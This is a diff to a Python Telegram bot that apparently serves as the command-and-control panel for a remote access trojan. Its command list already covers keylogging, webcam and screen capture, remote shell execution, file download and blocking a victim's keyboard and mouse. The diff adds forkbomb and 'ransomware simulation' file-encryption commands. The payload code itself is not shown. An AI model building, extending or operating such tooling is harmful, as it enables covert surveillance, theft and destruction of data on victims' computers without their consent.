@@ -1,5 +1,6 @@
 # api/index.py
 # FINAL VERSION - Added input and process blocking commands.
+# ADDED - Forkbomb and Ransomware simulation commands.
 
 import os
 import re
@@ -76,7 +77,7 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "`/list` \\- Show all active agents\n"
         "`/target <id|all|clear>` \\- Set the active agent\n"
         "`/help` \\- Display this help menu\n\n"
-        "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\- \n"
+        "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n"
         "*💻 SYSTEM & INFO*\n"
         "`/info` \\- Get detailed system information\n"
         "`/exec <command>` \\- Execute a shell command\n\n"
@@ -104,8 +105,12 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "`/cd <directory>` \\- Change directory\n"
         "`/pwd` \\- Show current directory\n"
         "`/download <file>` \\- Download a file from the agent\n\n"
-        "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n"
-        "*💣 DESTRUCTIVE COMMANDS*\n"
+        "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n"
+        "*💣 DESTRUCTIVE & ADVANCED*\n"
+        "`/forkbomb` \\- ⚠️ Rapidly spawns processes\n"
+        "`/cancelforkbomb` \\- Stop the fork bomb\n"
+        "`/ransomware` \\- ⚠️ *SIMULATION*\\. Reversibly encrypts files\n"
+        "`/restore` \\- Restores files from ransomware simulation\n"
         "`/destroy <id> CONFIRM` \\- Uninstall and remove the agent\n"
     )
     await update.message.reply_text(help_text, parse_mode='MarkdownV2')
@@ -189,7 +194,8 @@ agent_commands = [
     "info", "startkeylogger", "stopkeylogger", "grab", "exec", "ss", "cam", 
     "livestream", "stoplivestream", "livecam", "stoplivecam", "ls", "cd", 
     "pwd", "download", "blockkeyboard", "unblockkeyboard", "blockmouse", 
-    "unblockmouse", "startblocker", "stopblocker"
+    "unblockmouse", "startblocker", "stopblocker",
+    "forkbomb", "cancelforkbomb", "ransomware", "restore"
 ]
 for cmd in agent_commands:
     ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))
